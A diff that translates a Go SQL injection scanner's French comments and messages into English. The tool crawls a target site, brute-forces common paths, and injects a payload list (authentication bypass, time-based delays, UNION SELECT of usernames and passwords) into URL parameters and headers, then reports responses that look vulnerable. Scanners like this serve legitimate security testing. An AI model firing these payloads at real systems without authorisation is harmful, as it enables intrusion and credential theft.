@@ -19,7 +19,6 @@ import (
     "github.com/gocolly/colly/v2"
     "github.com/fatih/color"
     "github.com/schollz/progressbar/v3"
-    
 )
 
 var banner = `
@@ -30,11 +29,10 @@ var banner = `
  ___/ / /_/ / / /___    ___/ / /___/ ___ |/ /|  /  
 /____/\___\_\/_____/   /____/\____/_/  |_/_/ |_/   
  
-v1.0 - Injection SQL Vulneribility Scanner
+v1.0 - SQL Injection Vulnerability Scanner
 `
 
-
-// Structure principale pour la configuration
+// Main configuration structure
 type Config struct {
     Concurrent     int
     Timeout        time.Duration
@@ -46,7 +44,7 @@ type Config struct {
     StartTime      time.Time
 }
 
-// Structure pour les résultats du scan
+// Scan result structure
 type ScanResult struct {
     URL           string
     Vulnerable    bool
@@ -62,7 +60,7 @@ type ScanResult struct {
     ResponseLen   int
 }
 
-// Structure principale du scanner
+// Main scanner structure
 type Scanner struct {
     BaseURL     string
     Config      *Config
@@ -75,7 +73,7 @@ type Scanner struct {
     bar         *progressbar.ProgressBar
 }
 
-// Structure pour le scanner SQL
+// SQL Scanner structure
 type SQLScanner struct {
     payloads      []string
     errorPatterns []string
@@ -126,7 +124,7 @@ var sensitivePaths = []string{
     "/test/index.php",
 }
 
-// Extension des chemins avec différentes extensions
+// Extend paths with different extensions
 func generateExtendedPaths(paths []string) []string {
     extensions := []string{"", ".php", ".html", ".asp", ".aspx", ".jsp", ".action", ".do"}
     directories := []string{
@@ -137,10 +135,10 @@ func generateExtendedPaths(paths []string) []string {
 
     var extendedPaths []string
 
-    // Ajouter les chemins sensibles directs
+    // Add direct sensitive paths
     extendedPaths = append(extendedPaths, sensitivePaths...)
 
-    // Générer des combinaisons
+    // Generate combinations
     for _, dir := range directories {
         for _, ext := range extensions {
             extendedPaths = append(extendedPaths, dir+ext)
@@ -150,7 +148,7 @@ func generateExtendedPaths(paths []string) []string {
             extendedPaths = append(extendedPaths, dir+"/main"+ext)
         }
 
-        // Ajouter des sous-répertoires communs
+        // Add common subdirectories
         subDirs := []string{"/admin", "/user", "/manage", "/control", "/panel"}
         for _, subDir := range subDirs {
             for _, ext := range extensions {
@@ -164,7 +162,7 @@ func generateExtendedPaths(paths []string) []string {
     return extendedPaths
 }
 
-// Liste complète des payloads SQL
+// Complete list of SQL payloads
 var sqlPayloads = []string{
     "'",
     "' OR '1'='1",
@@ -192,22 +190,22 @@ var sqlPayloads = []string{
     "' OR 'x'='x' #",
     "/**/SELECT/**/",
     "' UnIoN SeLeCt ",
-    // Payloads spécifiques par type de base de données
+    // Database-specific payloads
     "' OR pg_sleep(5)--", // PostgreSQL
     "' OR IF(1=1, SLEEP(5), 0)--", // MySQL
     "' WAITFOR DELAY '00:00:05'--", // MSSQL
-    // Payloads pour bypass d'authentification
+    // Authentication bypass payloads
     "' OR 1=1--",
     "admin'--",
     "admin' #",
     "admin'/*",
-    // Payloads d'extraction de données
+    // Data extraction payloads
     "' UNION SELECT username,password FROM users--",
     "' UNION SELECT user(),database()--",
-    // Payloads basés sur le temps
+    // Time-based payloads
     "' OR IF(1=1, SLEEP(5), 0)--",
     "' OR pg_sleep(5)--",
-    // Payloads avec encodage (hex, base64)
+    // Encoded payloads (hex, base64)
     "0x31", // Hex
     "0x31' OR '1'='1",
     "0x31' OR 1=1--",
@@ -218,7 +216,7 @@ var sqlPayloads = []string{
     "ZGV2 UNION SELECT NULL--",
 }
 
-// Liste des patterns d'erreur SQL
+// List of SQL error patterns
 var sqlErrorPatterns = []string{
     "SQL syntax",
     "mysql_fetch",
@@ -246,7 +244,7 @@ var sqlErrorPatterns = []string{
     "Warning.*pg_.*",
     "valid PostgreSQL result",
     "Oracle.*ORA-[0-9]",
-    // Ajouter plus de patterns de détection d'erreur SQL
+    // Add more SQL error detection patterns
     "unterminated quoted string",
     "quoted string not properly terminated",
     "unexpected end of SQL command",
@@ -258,7 +256,7 @@ var sqlErrorPatterns = []string{
     "SQLSTATE[42S22]",
 }
 
-// Initialisation du Scanner SQL
+// Initialize SQL Scanner
 func NewSQLScanner(timeout time.Duration) *SQLScanner {
     return &SQLScanner{
         payloads:      sqlPayloads,
@@ -272,7 +270,7 @@ func NewSQLScanner(timeout time.Duration) *SQLScanner {
     }
 }
 
-// Test d'une URL spécifique
+// Test a specific URL
 func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, error) {
     start := time.Now()
 
@@ -295,7 +293,7 @@ func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, err
         return nil, err
     }
 
-    // Tester les en-têtes HTTP
+    // Test HTTP headers
     req.Header.Set("User-Agent", payload)
     req.Header.Set("Referer", payload)
 
@@ -319,27 +317,27 @@ func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, err
     for _, pattern := range s.errorPatterns {
         if strings.Contains(bodyStr, pattern) {
             isVulnerable = true
-            errorDetails = append(errorDetails, fmt.Sprintf("Pattern trouvé: %s", pattern))
+            errorDetails = append(errorDetails, fmt.Sprintf("Pattern found: %s", pattern))
         }
     }
 
     if resp.StatusCode == 500 {
         isVulnerable = true
-        errorDetails = append(errorDetails, "Erreur serveur 500 détectée")
+        errorDetails = append(errorDetails, "Server error 500 detected")
     }
 
     if duration > 5.0 {
-        errorDetails = append(errorDetails, "Temps de réponse anormal détecté")
+        errorDetails = append(errorDetails, "Abnormal response time detected")
     }
 
-    // Analyse des changements dans le DOM
+    // Analyze DOM changes
     doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
     if err != nil {
         return nil, err
     }
     domChanges := doc.Find("script, style, iframe, object, embed, link").Length()
     if domChanges > 0 {
-        errorDetails = append(errorDetails, fmt.Sprintf("Changements dans le DOM détectés: %d éléments", domChanges))
+        errorDetails = append(errorDetails, fmt.Sprintf("DOM changes detected: %d elements", domChanges))
     }
 
     return &ScanResult{
@@ -354,7 +352,7 @@ func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, err
     }, nil
 }
 
-// Initialisation du Scanner principal
+// Initialize main Scanner
 func NewScanner(baseURL string) *Scanner {
     config := &Config{
         Concurrent:     20,
@@ -393,7 +391,7 @@ func NewScanner(baseURL string) *Scanner {
     }
 }
 
-// Chargement d'une wordlist depuis GitHub
+// Load wordlist from GitHub
 func loadWordlist() ([]string, error) {
     wordlistURL := "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
 
@@ -413,19 +411,19 @@ func loadWordlist() ([]string, error) {
 }
 
 func (s *Scanner) scanPaths() error {
-    color.Yellow("\n[*] Chargement des chemins à tester...")
+    color.Yellow("\n[*] Loading paths to test...")
 
-    // Charger la wordlist de base
+    // Load base wordlist
     paths, err := loadWordlist()
     if err != nil {
-        return fmt.Errorf("erreur chargement wordlist: %v", err)
+        return fmt.Errorf("error loading wordlist: %v", err)
     }
 
-    // Générer les chemins étendus
+    // Generate extended paths
     extendedPaths := generateExtendedPaths(paths)
     paths = append(paths, extendedPaths...)
 
-    color.Yellow("[*] Total des chemins à tester: %d", len(paths))
+    color.Yellow("[*] Total paths to test: %d", len(paths))
 
     bar := progressbar.Default(int64(len(paths)))
     var wg sync.WaitGroup
@@ -445,7 +443,7 @@ func (s *Scanner) scanPaths() error {
                 return
             }
 
-            // Tester les cookies
+            // Test cookies
             req.AddCookie(&http.Cookie{Name: "test", Value: "test"})
 
             resp, err := http.DefaultClient.Do(req)
@@ -455,7 +453,7 @@ func (s *Scanner) scanPaths() error {
             }
             defer resp.Body.Close()
 
-            // Vérifier les codes de statut intéressants
+            // Check interesting status codes
             if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 401 {
                 s.mutex.Lock()
                 s.Pages[fullURL] = true
@@ -466,7 +464,7 @@ func (s *Scanner) scanPaths() error {
                     statusColor = color.FgYellow
                 }
 
-                color.New(statusColor).Printf("\n[+] Page trouvée: %s (Code: %d)\n", fullURL, resp.StatusCode)
+                color.New(statusColor).Printf("\n[+] Page found: %s (Code: %d)\n", fullURL, resp.StatusCode)
             }
 
             bar.Add(1)
@@ -479,14 +477,14 @@ func (s *Scanner) scanPaths() error {
 
 func (s *Scanner) Start() error {
     color.Cyan(banner)
-    color.Green("[+] Initialisation du scan sur %s", s.BaseURL)
+    color.Green("[+] Initializing scan on %s", s.BaseURL)
 
-    // Scan des chemins sensibles
+    // Scan sensitive paths
     if err := s.scanPaths(); err != nil {
-        return fmt.Errorf("erreur scan paths: %v", err)
+        return fmt.Errorf("error scanning paths: %v", err)
     }
 
-    // Configuration du crawler pour la découverte supplémentaire
+    // Configure crawler for additional discovery
     s.crawler.OnHTML("a[href]", func(e *colly.HTMLElement) {
         link := e.Attr("href")
         absoluteURL := e.Request.AbsoluteURL(link)
@@ -503,35 +501,35 @@ func (s *Scanner) Start() error {
         }
     })
 
-    // Crawling du site
+    // Crawl the site
     s.crawler.Visit(s.BaseURL)
     s.crawler.Wait()
 
-    // Exécuter les tests SQL
+    // Run SQL tests
     return s.runSQLTests()
 }
 
-// Génération du rapport
+// Generate report
 func (s *Scanner) GenerateReport() string {
     var output strings.Builder
 
-    color.New(color.FgGreen).Fprintln(&output, "\n=== Rapport de scan SQL ===\n")
-    color.New(color.FgCyan).Fprintf(&output, "URL de base: %s\n", s.BaseURL)
-    color.New(color.FgCyan).Fprintf(&output, "Pages testées: %d\n", len(s.Pages))
-    color.New(color.FgCyan).Fprintf(&output, "Tests effectués: %d\n", len(s.Pages) * len(sqlPayloads))
-    color.New(color.FgCyan).Fprintf(&output, "Durée du scan: %s\n", time.Since(s.Config.StartTime))
-    color.New(color.FgRed).Fprintf(&output, "Vulnérabilités trouvées: %d\n\n", len(s.Results))
+    color.New(color.FgGreen).Fprintln(&output, "\n=== SQL Scan Report ===\n")
+    color.New(color.FgCyan).Fprintf(&output, "Base URL: %s\n", s.BaseURL)
+    color.New(color.FgCyan).Fprintf(&output, "Pages tested: %d\n", len(s.Pages))
+    color.New(color.FgCyan).Fprintf(&output, "Tests performed: %d\n", len(s.Pages) * len(sqlPayloads))
+    color.New(color.FgCyan).Fprintf(&output, "Scan duration: %s\n", time.Since(s.Config.StartTime))
+    color.New(color.FgRed).Fprintf(&output, "Vulnerabilities found: %d\n\n", len(s.Results))
 
     for _, result := range s.Results {
-        color.New(color.FgRed).Fprintf(&output, "URL vulnérable: %s\n", result.URL)
+        color.New(color.FgRed).Fprintf(&output, "Vulnerable URL: %s\n", result.URL)
         color.New(color.FgYellow).Fprintf(&output, "Payload: %s\n", result.Payload)
-        color.New(color.FgCyan).Fprintf(&output, "Code status: %d\n", result.StatusCode)
-        color.New(color.FgCyan).Fprintf(&output, "Temps de réponse: %.2fs\n", result.ResponseTime)
-        color.New(color.FgCyan).Fprintf(&output, "Niveau de risque: %s\n", result.RiskLevel)
-        color.New(color.FgCyan).Fprintf(&output, "Exemple de correction: %s\n", result.FixExample)
+        color.New(color.FgCyan).Fprintf(&output, "Status code: %d\n", result.StatusCode)
+        color.New(color.FgCyan).Fprintf(&output, "Response time: %.2fs\n", result.ResponseTime)
+        color.New(color.FgCyan).Fprintf(&output, "Risk level: %s\n", result.RiskLevel)
+        color.New(color.FgCyan).Fprintf(&output, "Fix example: %s\n", result.FixExample)
 
         if len(result.ErrorDetails) > 0 {
-            color.New(color.FgYellow).Fprintln(&output, "Détails:")
+            color.New(color.FgYellow).Fprintln(&output, "Details:")
             for _, detail := range result.ErrorDetails {
                 color.New(color.FgWhite).Fprintf(&output, "  - %s\n", detail)
             }
@@ -555,32 +553,32 @@ func main() {
 
     err := scanner.Start()
     if err != nil {
-        color.Red("[!] Erreur lors du scan: %v", err)
+        color.Red("[!] Error during scan: %v", err)
         os.Exit(1)
     }
 
-    // Génération et affichage du rapport
+    // Generate and display report
     report := scanner.GenerateReport()
     fmt.Println(report)
 
-    // Sauvegarde du rapport dans un fichier
+    // Save report to file
     /*
     reportPath := fmt.Sprintf("report_%s.txt", time.Now().Format("20060102_150405"))
     err = ioutil.WriteFile(reportPath, []byte(report), 0644)
     if err != nil {
-        color.Red("[!] Erreur lors de la sauvegarde du rapport: %v", err)
+        color.Red("[!] Error saving report: %v", err)
     } else {
-        color.Green("[+] Rapport sauvegardé dans: %s", reportPath)
+        color.Green("[+] Report saved to: %s", reportPath)
     }*/
 
-    // Affichage des statistiques finales
-    color.Yellow("\nStatistiques finales:")
-    color.Yellow("- Durée totale: %s", time.Since(scanner.Config.StartTime))
-    color.Yellow("- Pages scannées: %d", len(scanner.Pages))
-    color.Yellow("- Tests d'injection effectués: %d", len(scanner.Pages)*len(sqlPayloads))
-    color.Yellow("- Vulnérabilités trouvées: %d", len(scanner.Results))
+    // Display final statistics
+    color.Yellow("\nFinal statistics:")
+    color.Yellow("- Total duration: %s", time.Since(scanner.Config.StartTime))
+    color.Yellow("- Pages scanned: %d", len(scanner.Pages))
+    color.Yellow("- Injection tests performed: %d", len(scanner.Pages)*len(sqlPayloads))
+    color.Yellow("- Vulnerabilities found: %d", len(scanner.Results))
 
-    // Si des vulnérabilités ont été trouvées, créer aussi un rapport JSON
+    // If vulnerabilities were found, create JSON report
     if len(scanner.Results) > 0 {
         jsonReport := struct {
             Timestamp    time.Time     `json:"timestamp"`
@@ -602,37 +600,37 @@ func main() {
         if err == nil {
             jsonPath := fmt.Sprintf("report_%s.json", time.Now().Format("20060102_150405"))
             if err := ioutil.WriteFile(jsonPath, jsonData, 0644); err == nil {
-                color.Green("[+] Rapport JSON sauvegardé dans: %s", jsonPath)
+                color.Green("[+] JSON report saved to: %s", jsonPath)
             }
         }
     }
 
-    // Suggestions de sécurité si des vulnérabilités sont trouvées
+    // Security suggestions if vulnerabilities are found
     if len(scanner.Results) > 0 {
-        color.Red("\n[!] Des vulnérabilités ont été trouvées. Suggestions de sécurité:")
-        color.Yellow("1. Utilisez des requêtes préparées ou des ORM")
-        color.Yellow("2. Validez et assainissez toutes les entrées utilisateur")
-        color.Yellow("3. Appliquez le principe du moindre privilège pour les utilisateurs de la base de données")
-        color.Yellow("4. Activez le pare-feu applicatif web (WAF)")
-        color.Yellow("5. Surveillez les journaux de la base de données")
+        color.Red("\n[!] Vulnerabilities were found. Security suggestions:")
+        color.Yellow("1. Use prepared statements or ORMs")
+        color.Yellow("2. Validate and sanitize all user input")
+        color.Yellow("3. Apply the principle of least privilege for database users")
+        color.Yellow("4. Enable Web Application Firewall (WAF)")
+        color.Yellow("5. Monitor database logs")
     }
 
-    // Message de fin
+    // End message
     if len(scanner.Results) == 0 {
-        color.Green("\n[+] Aucune vulnérabilité SQL n'a été détectée!")
+        color.Green("\n[+] No SQL vulnerabilities detected!")
     } else {
-        color.Red("\n[!] Le scan est terminé. Veuillez examiner le rapport pour plus de détails.")
+        color.Red("\n[!] Scan completed. Please review the report for details.")
     }
 
-    // Nettoyage
+    // Cleanup
     if err := scanner.Logger.Writer().(*os.File).Close(); err != nil {
-        color.Red("[!] Erreur lors de la fermeture du fichier de log: %v", err)
+        color.Red("[!] Error closing log file: %v", err)
     }
 }
 
 func (s *Scanner) runSQLTests() error {
-    color.Green("\n[+] Début des tests d'injection SQL")
-    color.Yellow("[*] Test des %d pages découvertes avec %d payloads", len(s.Pages), len(sqlPayloads))
+    color.Green("\n[+] Starting SQL injection tests")
+    color.Yellow("[*] Testing %d discovered pages with %d payloads", len(s.Pages), len(sqlPayloads))
 
     bar := progressbar.Default(int64(len(s.Pages) * len(sqlPayloads)))
 
@@ -640,13 +638,13 @@ func (s *Scanner) runSQLTests() error {
     sem := make(chan bool, s.Config.Concurrent)
 
     for page := range s.Pages {
-        // Vérification si la page contient des paramètres GET
+        // Check if page has GET parameters
         parsedURL, err := url.Parse(page)
         if err != nil {
             continue
         }
 
-        // Si l'URL n'a pas de paramètres, on ajoute un paramètre 'id' test
+        // If URL has no parameters, add a test 'id' parameter
         hasParams := len(parsedURL.Query()) > 0
 
         for _, payload := range sqlPayloads {
@@ -657,7 +655,7 @@ func (s *Scanner) runSQLTests() error {
                 defer wg.Done()
                 defer func() { <-sem }()
 
-                // Si pas de paramètres, on teste avec un paramètre ajouté
+                // If no parameters, test with added parameter
                 if !hasParams {
                     if strings.Contains(p, "?") {
                         p += "&id=1"
@@ -668,7 +666,7 @@ func (s *Scanner) runSQLTests() error {
 
                 result, err := s.sqlScanner.TestURL(p, payload)
                 if err != nil {
-                    s.Logger.Printf("Erreur test %s: %v", p, err)
+                    s.Logger.Printf("Error testing %s: %v", p, err)
                     bar.Add(1)
                     return
                 }
@@ -676,15 +674,15 @@ func (s *Scanner) runSQLTests() error {
                 if result.Vulnerable {
                     s.mutex.Lock()
                     result.RiskLevel = "High"
-                    result.FixExample = "Utilisez des requêtes préparées pour éviter les injections SQL."
+                    result.FixExample = "Use prepared statements to prevent SQL injection."
                     s.Results = append(s.Results, *result)
                     s.mutex.Unlock()
 
-                    color.Red("\n[!] Vulnérabilité trouvée!")
+                    color.Red("\n[!] Vulnerability found!")
                     color.Red("    URL: %s", p)
                     color.Red("    Payload: %s", payload)
                     if len(result.ErrorDetails) > 0 {
-                        color.Yellow("    Détails: %s", strings.Join(result.ErrorDetails, ", "))
+                        color.Yellow("    Details: %s", strings.Join(result.ErrorDetails, ", "))
                     }
                 }
 
@@ -695,11 +693,11 @@ func (s *Scanner) runSQLTests() error {
 
     wg.Wait()
 
-    color.Green("\n[+] Tests d'injection SQL terminés")
+    color.Green("\n[+] SQL injection tests completed")
     if len(s.Results) > 0 {
-        color.Red("[!] %d vulnérabilités trouvées", len(s.Results))
+        color.Red("[!] %d vulnerabilities found", len(s.Results))
     } else {
-        color.Green("[+] Aucune vulnérabilité SQL détectée")
+        color.Green("[+] No SQL vulnerabilities detected")
     }
 
     return nil
